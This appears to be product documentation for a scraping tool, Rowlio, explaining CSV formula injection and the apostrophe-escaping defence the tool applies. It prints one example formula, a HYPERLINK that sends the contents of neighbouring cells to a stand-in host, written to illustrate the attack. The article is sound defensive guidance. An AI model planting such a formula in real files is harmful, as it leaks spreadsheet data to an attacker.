A CSV file is plain text, so it seems unable to do any harm. The risk appears when a spreadsheet opens it. Spreadsheets treat some cells as instructions, and if the text in those cells came from a web page, someone else decided what the instruction is. This is known as CSV injection or formula injection, and anyone who exports scraped data should understand it.

How it works

When a spreadsheet opens a CSV, it inspects each cell. A cell whose text begins with = is evaluated as a formula. So are cells beginning with +, - and @, for compatibility with older spreadsheet programs.

Now imagine a public page with a review whose "name" field reads:

=HYPERLINK("http://example.test/?d="&A2&B2,"Click for details")

On the web page this is odd-looking text. In your exported file it is a cell. When a colleague opens the file, the spreadsheet builds a link that contains the contents of neighbouring cells, and displays it as an innocent "Click for details". One click sends that data to a server the attacker controls.

Why it matters

  • Data can leak. Formulas can read other cells and place them in a link or a request, as above.
  • Content can be falsified. A formula can display a value that differs from what the source contained, which undermines anything built on the sheet.
  • Older setups can run commands. Historic features such as DDE allowed a formula to start a program. Current versions of Excel block or warn about this, but warnings get clicked through, and not every machine is current.

The person at risk is whoever opens the file, often not the person who scraped the data. A file from a trusted colleague is opened without suspicion, which is exactly what makes the attack work.

Why scraped data is especially exposed

With scraping, every cell is untrusted input by definition. User names, reviews, comments, product titles and forum posts are all text that a stranger typed. Most of it is harmless. It takes only one crafted value among ten thousand rows.

Harmless data triggers the same behaviour by accident too. A phone number written +880 1712 345678, a note saying -see below or a social handle @username all begin with a trigger character. Without protection, these show up as errors or mangled values.

The standard defence

The widely recommended fix, described in OWASP's guidance on CSV injection, is to make such cells unmistakably text. Before writing a cell that begins with =, +, -, @, a tab or a carriage return, the exporter puts an apostrophe in front of it:

'=HYPERLINK("http://example.test/?d="&A2&B2,"Click for details")

Spreadsheets read a leading apostrophe as "this is text". The cell shows the original characters and nothing is evaluated.

A blunt version of this rule damages real data, because -12.50 is a legitimate negative number that should stay a number. A careful exporter therefore leaves plain signed numbers alone and protects everything else that starts with a trigger character.

How Rowlio handles it

  • CSV, TSV and clipboard copies apply the apostrophe rule by default, with the exception for plain numbers such as -12.5 or +3.
  • HTML table exports get the same treatment, because spreadsheets can open HTML tables and evaluate them in the same way.
  • Excel (XLSX) files are immune by construction. Every text value is written as a text cell, never as a formula, so there is nothing to evaluate.
  • The protection can be switched off for a single export, for the case where a program rather than a spreadsheet will read the file and needs the raw characters.

What you should do

  • Leave the protection on for any file a person will open.
  • Prefer XLSX when the destination is a spreadsheet. It avoids this problem and the encoding and delimiter problems of CSV at the same time.
  • Do not click through warnings. If a spreadsheet asks whether to enable links or external content in a data file, the answer is no.
  • Treat received CSV files the same way. A file exported by a tool without this protection carries the risk, whoever sent it.
  • Check how your other tools export. Open a test file containing a cell with =1+1. If the sheet shows 2, the exporter is not protecting you.

The wider lesson

Formula injection is one case of a general rule: text taken from the web is data, and should never be allowed to become instructions. The same rule is why a scraping tool should display page content as plain text instead of rendering it, and why its exports should escape that content for the format they are written in. It is worth asking of any tool that handles data you did not write yourself.
